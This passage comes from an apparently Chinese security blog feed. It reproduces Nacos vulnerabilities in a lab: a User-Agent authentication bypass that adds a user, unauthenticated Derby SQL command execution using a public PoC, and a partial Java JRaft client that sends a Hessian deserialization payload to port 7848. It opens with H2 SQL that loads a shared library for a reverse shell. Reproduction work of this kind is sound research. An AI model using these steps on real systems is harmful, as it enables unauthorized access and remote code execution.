class="hljs-comment">-- 引入System.load方法</span><br><span class="hljs-keyword">CREATE</span> ALIAS SYS_LOAD <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;java.lang.System.load(java.lang.String)&#x27;</span>;<br><span class="hljs-comment">-- 调用load方法，反弹shell</span><br><span class="hljs-keyword">CALL</span> SYS_LOAD(<span class="hljs-string">&#x27;/tmp/exp.so&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>可以用xxd -p命令生成纯十六进制字符，加上tr -d ‘\n’命令去除换行符</p></blockquote><p>但是这里我前面的java exp又出问题了，运行之后他会报下面的错误</p><p><img src="https://cdn.clown2024.cn/image-20250326214307800.png" alt="image-20250326214307800"></p><p>大致说的是未找到java.lang.Object的序列化器，emmm这就很奇怪，为什么会发生不能序列化的情况呢，原来的弹计算器的sql在本地也是能正常执行的，而且看日志前面已经成功执行了System.load了</p><p>难蚌后来发现这只能打一次，打完之后要重启靶机才行😓</p><p>最后反弹shell过来，改一下flag的权限即可</p><p><img src="https://cdn.clown2024.cn/image-20250326204304609.png" alt="image-20250326204304609"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当时没怎么打，现在来复现一下，也是学到蛮多东西&lt;/p&gt;
&lt;h1 id=&quot;internal_api&quot;&gt;&lt;a href=&quot;#internal-api&quot; class=&quot;headerlink&quot; title=&quot;internal_api&quot;&gt;&lt;/a&gt;internal_api&lt;/h1&gt;&lt;p</summary>
      
    
    
    
    <category term="题目复现" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Nacos漏洞学习</title>
    <link href="https://clowsman.github.io/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-03-02T13:44:14.000Z</published>
    <updated>2025-03-31T09:47:07.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在看Java微服务相关的知识，那就顺便学一下Nacos相关的漏洞</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>NACOS的官网：<a href="https://nacos.io/">https://nacos.io/</a></p><p>Nacos 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</p><h1 id="未授权访问漏洞cve-2021-29441"><a href="#未授权访问漏洞-CVE-2021-29441" class="headerlink" title="未授权访问漏洞(CVE-2021-29441)"></a>未授权访问漏洞(CVE-2021-29441)</h1><p><strong>影响版本</strong></p><p>Nacos &lt;&#x3D; 2.0.0-ALPHA.1或者&lt;&#x3D;1.4.0</p><p><strong>漏洞详情</strong></p><p>nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。</p><p><strong>复现</strong></p><p>这里直接用vulhub的环境即可</p><p>访问nacos&#x2F;v1&#x2F;auth&#x2F;users?pageNo&#x3D;1&amp;pageSize&#x3D;9接口</p><p><img src="https://cdn.clown2024.cn/image-20250308163045149.png" alt="image-20250308163045149"></p><p>正常来说访问是403的，我们UA头加上Nacos-Server就可以绕过验证，此时就为200了</p><p><img src="https://cdn.clown2024.cn/image-20250308163418761.png" alt="image-20250308163418761"></p><p>此时我们可以POST访问nacos&#x2F;v1&#x2F;auth&#x2F;users接口，body为username&#x3D;clown&amp;password&#x3D;clown，添加一个新用户</p><p><img src="https://cdn.clown2024.cn/image-20250308163614387.png" alt="image-20250308163614387"></p><p>然后我们就可以直接用该用户去登录后台了</p><p><img src="https://cdn.clown2024.cn/image-20250308163751992.png" alt="image-20250308163751992"></p><p>可以看到我们的用户是添加成功了，回来的是用户名和加密密码</p><h1 id="未授权接口命令执行漏洞cve-2021-29442"><a href="#未授权接口命令执行漏洞-CVE-2021-29442" class="headerlink" title="未授权接口命令执行漏洞(CVE-2021-29442)"></a>未授权接口命令执行漏洞(CVE-2021-29442)</h1><p><strong>影响版本</strong></p><p>Nacos &lt; 1.4.1</p><p><strong>漏洞详情</strong></p><p>在Nacos 1.4.1之前的版本中，一些API端点（如<code>/nacos/v1/cs/ops/derby</code>）可以默认没有鉴权，可以被未经身份验证的用户公开访问。攻击者可以利用该漏洞执行任意Derby SQL语句和 Java 代码。</p><p><strong>复现</strong></p><p>访问一下&#x2F;nacos&#x2F;v1&#x2F;cs&#x2F;ops&#x2F;derby接口</p><p><img src="https://cdn.clown2024.cn/image-20250308220533168.png" alt="image-20250308220533168"></p><p>可以看到未鉴权</p><p>Derby是用java编写的一个数据库，可以上传jar包rce，直接用vulhub的poc验证即可（原理先空着🥲）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python poc.py -t http://your-ip:8848 -c <span class="hljs-string">&quot;root&quot;</span>  <br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250308222525087.png" alt="image-20250308222525087"></p><h1 id="raft-hessian反序列化"><a href="#Raft-Hessian反序列化" class="headerlink" title="Raft Hessian反序列化"></a>Raft Hessian反序列化</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>漏洞影响的范围是nacos的7848端口</p><p>7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化</p><p>Nacos 1.x在单机模式下默认不开放7848端口，故该情况通常不受此漏洞影响。然而，2.x版本无论单机或集群模式均默认开放7848端口。</p><p>所以影响范围为：</p><p>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6 使用cluster集群模式运行<br>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3 任意模式启动均受到影响</p><h2 id="前置知识了解"><a href="#前置知识了解" class="headerlink" title="前置知识了解"></a>前置知识了解</h2><h3 id="grpc-java"><a href="#grpc-java" class="headerlink" title="grpc-java"></a>grpc-java</h3><p>nacos的客户端和和server之间是通过HTTP来通信的，而集群节点间是以grpc来通信的，所以我们等会构造数据包的时候就是以grpc的形式</p><p>grpc的使用可以参考一下官方文档：<a href="https://grpc.io/docs/languages/java/generated-code/">https://grpc.io/docs/languages/java/generated-code/</a></p><p>还有官方的代码仓库：<a href="https://github.com/grpc/grpc-java">https://github.com/grpc/grpc-java</a></p><p><strong>先添加依赖</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-netty-shaded<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-protobuf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-stub<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--运行服务端需要--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.grpc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>grpc-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.50.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>定义proto文件</strong></p><p>在src&#x2F;main目录下创建proto目录，然后创建一个proto文件</p><figure class="highlight protobuf"><table><tr><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">option</span> java_multiple_files = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">option</span> java_package = <span class="hljs-string">&quot;com.example.grpc.api&quot;</span>;<br><br><span class="hljs-keyword">service </span><span class="hljs-title class_">Greeter</span> &#123;<br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHello (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloRequest</span> &#123;<br>  <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloReply</span> &#123;<br>  <span class="hljs-type">string</span> message = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250329165534865.png" alt="image-20250329165534865"></p><p><strong>生成代码</strong></p><p>可以用Maven插件或者命令行工具生成</p><p>插件的用法可以看官方文档：<a href="https://grpc.io/docs/languages/java/generated-code/#codegen">https://grpc.io/docs/languages/java/generated-code/#codegen</a></p><blockquote><p>emmm这里我的插件依赖一直是红的，用不了</p></blockquote><p>这里还是用命令行的形式</p><p>首先下载protobuf：<a href="https://github.com/protocolbuffers/protobuf">https://github.com/protocolbuffers/protobuf</a></p><p>然后下载插件：<a href="https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/">https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/</a></p><p>接下来进到我们的proto目录，然后将刚刚下载的grpc-java插件移到这里并重命名为<code>protoc-gen-grpc-java</code></p><p><img src="https://cdn.clown2024.cn/image-20250329165727150.png" alt="image-20250329165727150"></p><p>然后用下面命令生成代码</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">protoc --plugin=protoc-gen-grpc-java.exe --grpc-java_out=../java --java_out=../java helloworld.proto<br><span class="hljs-comment"># --plugin 指定 gRPC-Java 插件（需可执行文件）</span><br><span class="hljs-comment"># --grpc-java_out 输出 gRPC 服务代码到 ../java</span><br><span class="hljs-comment"># --java_out 输出普通 Java 消息类到 ../java</span><br></code></pre></td></tr></table></figure><blockquote><p>这里要注意一下protobuf的版本，我用比较新的版本生成的代码会有些依赖没有，换成比较低的23.2版本才行</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20250329174707984.png" alt="image-20250329174707984"></p><p>然后就是实现具体的代码</p><p><strong>编写服务端实现代码</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.service;<br><br><span class="hljs-keyword">import</span> com.example.grpc.api.GreeterGrpc;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloReply;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloRequest;<br><span class="hljs-keyword">import</span> io.grpc.stub.StreamObserver;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GreeterGrpc</span>.GreeterImplBase &#123;<br><br>    <span class="hljs-comment">// 实现方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloRequest request, StreamObserver&lt;HelloReply&gt; responseObserver)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> request.getName();<br>        <span class="hljs-type">HelloReply</span> <span class="hljs-variable">helloReply</span> <span class="hljs-operator">=</span> HelloReply.newBuilder().setMessage(<span class="hljs-string">&quot;Hello, &quot;</span>+name).build();<br>        responseObserver.onNext(helloReply);<br>        responseObserver.onCompleted();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>运行服务</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.service;<br><br><span class="hljs-keyword">import</span> io.grpc.Server;<br><span class="hljs-keyword">import</span> io.grpc.ServerBuilder;<br><span class="hljs-comment">// 启动服务</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br>        <span class="hljs-type">Server</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> ServerBuilder.forPort(port).addService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GreeterService</span>()).build();<br>        server.start();<br><br>        System.out.println(<span class="hljs-string">&quot;Running...&quot;</span>);<br>        server.awaitTermination();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>实现客户端代码</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.client;<br><br><span class="hljs-keyword">import</span> com.example.grpc.api.GreeterGrpc;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloReply;<br><span class="hljs-keyword">import</span> com.example.grpc.api.HelloRequest;<br><span class="hljs-keyword">import</span> io.grpc.Channel;<br><span class="hljs-keyword">import</span> io.grpc.ManagedChannelBuilder;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GreeterClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();<br>        GreeterGrpc.<span class="hljs-type">GreeterBlockingStub</span> <span class="hljs-variable">greeterBlockingStub</span> <span class="hljs-operator">=</span> GreeterGrpc.newBlockingStub(channel);<br>        <span class="hljs-type">HelloRequest</span> <span class="hljs-variable">helloRequest</span> <span class="hljs-operator">=</span> HelloRequest.newBuilder().setName(<span class="hljs-string">&quot;clown&quot;</span>).build();<br>        <span class="hljs-type">HelloReply</span> <span class="hljs-variable">helloReply</span> <span class="hljs-operator">=</span> greeterBlockingStub.sayHello(helloRequest);<br>        System.out.println(helloReply.getMessage());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250329181930632.png" alt="image-20250329181930632"></p><h3 id="jraft协议"><a href="#JRaft协议" class="headerlink" title="JRaft协议"></a>JRaft协议</h3><p>有关Raft算法的知识需要提前了解一下，Raft是一种常用于集群间数据同步的共识算法，JRaft是其java实现，这个就不在这里多介绍了，可以看一下官方文档：<a href="https://www.sofastack.tech/projects/sofa-jraft/overview/">https://www.sofastack.tech/projects/sofa-jraft/overview/</a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>这里下载一个2.2.2版本的nacos：<a href="https://github.com/alibaba/nacos/releases/tag/2.2.2">https://github.com/alibaba/nacos/releases/tag/2.2.2</a></p><p>因为这里只需要启动单机模式即可验证，而且默认启动内嵌Derby数据库，可以写一个简单的docker来配置</p><p>dockerfile文件</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> docker.xuanyuan.me/openjdk:<span class="hljs-number">8</span>u342-jre<br><br><span class="hljs-comment"># 复制归档文件并自动解压</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> nacos-server-2.2.2.tar.gz /root</span><br><br><span class="hljs-comment"># 安装网络和进程管理工具包，-y 表示自动确认所有安装提示</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span><br><span class="language-bash">    apt install net-tools procps -y</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /root</span><br></code></pre></td></tr></table></figure><p>docker-compose文件</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;3&#x27;</span><br><br>services:<br>  nacos:<br>    build: .<br>    container_name: nacos<br>    ports:<br>      - <span class="hljs-number">5005</span>:<span class="hljs-number">5005</span> <span class="hljs-comment"># 开启远程调试端口</span><br>      - <span class="hljs-number">7848</span>:<span class="hljs-number">7848</span> <span class="hljs-comment"># 开启JRaft端口</span><br>      - <span class="hljs-number">8848</span>:<span class="hljs-number">8848</span> <span class="hljs-comment"># nacos控制台端口</span><br>    environment:<br>      - JAVA_OPT=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span> <span class="hljs-comment"># 开启远程调试的启动参数</span><br>    command: <br>      - /bin/sh<br>      - -c<br>      - |<br>        bash nacos/bin/startup.sh -m standalone<br>        tail -f nacos/logs/start.out<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>可以看一下修复的补丁：<a href="https://github.com/alibaba/nacos/pull/10542/files">https://github.com/alibaba/nacos/pull/10542/files</a></p><p>看修复的补丁我们也可以很明显地知道，他加了一个Hessian反序列化的白名单</p><p><img src="https://cdn.clown2024.cn/image-20250328234639269.png" alt="image-20250328234639269"></p><p>我们先找找他是在哪里进行的Hessian反序列化</p><p>我们可以直接下载源码来看</p><p><img src="https://cdn.clown2024.cn/image-20250328235032707.png" alt="image-20250328235032707"></p><p>可以看到这里默认用的就是Hessian，<code>com.alibaba.nacos.consistency.SerializeFactory#getDefault</code> 序列化工厂类</p><p>反序列化的地方也很容易知道</p><p><img src="https://cdn.clown2024.cn/image-20250328235202888.png" alt="image-20250328235202888"></p><p>可以看到有漏洞的版本没有任何过滤</p><h3 id="本地启动"><a href="#本地启动" class="headerlink" title="本地启动"></a>本地启动</h3><p>就是突然想记录一下（</p><p>找到这样一篇文章：<a href="https://blog.csdn.net/qq_41316955/article/details/135467159">https://blog.csdn.net/qq_41316955/article/details/135467159</a></p><p>根据他的步骤来</p><p>我们要先编译一下项目，目的是为了生成一下grpc的代码</p><p><img src="https://cdn.clown2024.cn/image-20250330213233054.png" alt="image-20250330213233054"></p><p>然后去consistency目录</p><p><img src="https://cdn.clown2024.cn/image-20250330212610402.png" alt="image-20250330212610402"></p><p>添加proto目录为Source Root</p><p>然后找到nacos-console这个模块，直接运行console模块里的 com.alibaba.nacos.Nacos.java，在IDEA的JVM的启动参数配置为单机启动和配置nacos的工作目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">-Dnacos.standalone=<span class="hljs-literal">true</span> -Dnacos.home=D:\CTF\Java\Nacos\nacos-2.2.2\nacos-2.2.2<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250330213058726.png" alt="image-20250330213058726"></p><p>然后我们现在再启动就可以了</p><p><img src="https://cdn.clown2024.cn/image-20250330213510138.png" alt="image-20250330213510138"></p><h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>这里可以参考前面写的java远程调试，之前没详细记录，这里再顺便写一下</p><p>前面的docker已经开放了5005的远程调试端口给我们了</p><p>这里开一个jvm debug选项</p><p><img src="https://cdn.clown2024.cn/image-20250330214919561.png" alt="image-20250330214919561"></p><p>然后启动即可</p><p><img src="https://cdn.clown2024.cn/image-20250330215002173.png" alt="image-20250330215002173"></p><p>目前就是知道了hessian反序列化，但是在哪里调用，在哪里触发呢</p><p>如果要发生反序列化，那就肯定是在发生数据读取或者应用的地方，在JRaft中，提交的任务最终将会复制应用到所有 raft 节点上的状态机。onApply 是StateMachine最核心的方法。</p><p>nacos这里就是在<code>com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply</code>方法</p><p><img src="https://cdn.clown2024.cn/image-20250330220732661.png" alt="image-20250330220732661"></p><p>我们接下来构造一个JRaft写请求去看看他的调用堆栈</p><h3 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h3><p>这里我们需要去构建一个写请求(WriteRequest)，模拟数据变更</p><p>grpc所需要的proto文件在<code>nacos-2.2.2/consistency/src/main/proto/</code>里面</p><p>去看源码可以看到，有关一些类并不存在</p><p><img src="https://cdn.clown2024.cn/image-20250330205549132.png" alt="image-20250330205549132"></p><p>这些都在.proto文件里面，将该文件放到我们前面的grpc项目进行编译生成代码</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">.\protoc.exe --plugin=protoc-gen-grpc-java.exe --grpc-java_out=../java --java_out=../java consistency.proto<br></code></pre></td></tr></table></figure><p>然后我们参考JRaft的文档去写客户端：<a href="https://www.sofastack.tech/projects/sofa-jraft/counter-example/%EF%BC%88%E4%BD%86%E6%98%AF%E4%B8%8D%E5%A4%AA%E5%A5%BD%E5%86%99%EF%BC%8C%E6%88%91%E4%B9%9F%E4%B8%8D%E7%9F%A5%E9%81%93%E4%BB%96%E4%BB%AC%E6%98%AF%E5%92%8B%E5%8F%82%E8%80%83%E7%9A%84%F0%9F%A5%B2%EF%BC%89">https://www.sofastack.tech/projects/sofa-jraft/counter-example/（但是不太好写，我也不知道他们是咋参考的🥲）</a></p><p>引入下面的依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alipay.sofa<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jraft-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alipay.sofa<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rpc-grpc-impl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最后可以写出下面的客户端，直接copy文章的，然后让ds给我加了些注释：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.client;<br><br><span class="hljs-keyword">import</span> com.alibaba.nacos.consistency.entity.WriteRequest;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.entity.PeerId;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.option.CliOptions;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.GrpcClient;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;<br><span class="hljs-keyword">import</span> com.google.protobuf.ByteString;<br><span class="hljs-keyword">import</span> com.google.protobuf.Message;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// ==================== 初始化配置 ====================</span><br>        <span class="hljs-comment">// 目标 Raft 集群 Leader 节点地址（格式：IP:Port）</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1:7848&quot;</span>;<br>        <span class="hljs-comment">// 构造待发送的业务数据（示例为空数据，实际应为序列化后的有效负载）</span><br>        <span class="hljs-type">byte</span>[] poc = Poc.getPoc();<br><span class="hljs-comment">//        byte[] poc = &quot;hello&quot;.getBytes();</span><br><br>        <span class="hljs-comment">// ==================== 初始化 JRaft 客户端服务 ====================</span><br>        <span class="hljs-comment">// 创建 JRaft 客户端服务实例（用于与 Raft 集群通信）</span><br>        <span class="hljs-type">CliClientServiceImpl</span> <span class="hljs-variable">cliClientService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CliClientServiceImpl</span>();<br>        <span class="hljs-comment">// 初始化客户端服务（使用默认配置）</span><br>        cliClientService.init(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CliOptions</span>());<br><br>        <span class="hljs-comment">// ==================== 构建请求目标 ====================</span><br>        <span class="hljs-comment">// 解析 Leader 节点地址信息（PeerId 包含节点 IP 和 Port）</span><br>        <span class="hljs-type">PeerId</span> <span class="hljs-variable">leader</span> <span class="hljs-operator">=</span> PeerId.parsePeer(address);<br><br>        <span class="hljs-comment">// ==================== 构造业务请求 ====================</span><br>        <span class="hljs-comment">// 创建 Nacos 的 WriteRequest 请求（使用 Protobuf 构建）</span><br>        <span class="hljs-type">WriteRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WriteRequest.newBuilder()<br><span class="hljs-comment">//                .setGroup(&quot;naming_persistent_service_v2&quot;) // Nacos 的持久化服务组名</span><br>                .setGroup(<span class="hljs-string">&quot;naming_service_metadata&quot;</span>)<br><span class="hljs-comment">//                .setGroup(&quot;naming_instance_metadata&quot;)</span><br>                .setData(ByteString.copyFrom(poc))         <span class="hljs-comment">// 业务数据（需按 Nacos 格式序列化）</span><br>                .build();<br><br>        <span class="hljs-comment">// ==================== 获取底层 RPC 客户端 ====================</span><br>        <span class="hljs-comment">// 获取 JRaft 的 gRPC 客户端实例（实际通信处理器）</span><br>        <span class="hljs-type">GrpcClient</span> <span class="hljs-variable">grpcClient</span> <span class="hljs-operator">=</span> (GrpcClient) cliClientService.getRpcClient();<br><br>        <span class="hljs-comment">// ==================== 反射注入自定义请求类型 ====================</span><br>        <span class="hljs-comment">// 关键步骤：由于 WriteRequest 是 Nacos 自定义类型，需手动注册到 JRaft 的解析器</span><br><br>        <span class="hljs-comment">// 反射获取 GrpcClient 内部的协议解析器映射表（parserClasses）</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">parserClassesField</span> <span class="hljs-operator">=</span> GrpcClient.class.getDeclaredField(<span class="hljs-string">&quot;parserClasses&quot;</span>);<br>        parserClassesField.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 突破私有访问限制</span><br>        Map&lt;String, Message&gt; parserClasses = (Map) parserClassesField.get(grpcClient);<br><br>        <span class="hljs-comment">// 注册 WriteRequest 类型到解析器（使 JRaft 能识别该 Protobuf 类型）</span><br>        parserClasses.put(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());<br>        <span class="hljs-comment">// 注册响应类型解析器（用于反序列化服务端响应）</span><br>        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());<br><br>        <span class="hljs-comment">// ==================== 发送请求并获取响应 ====================</span><br>        <span class="hljs-comment">// 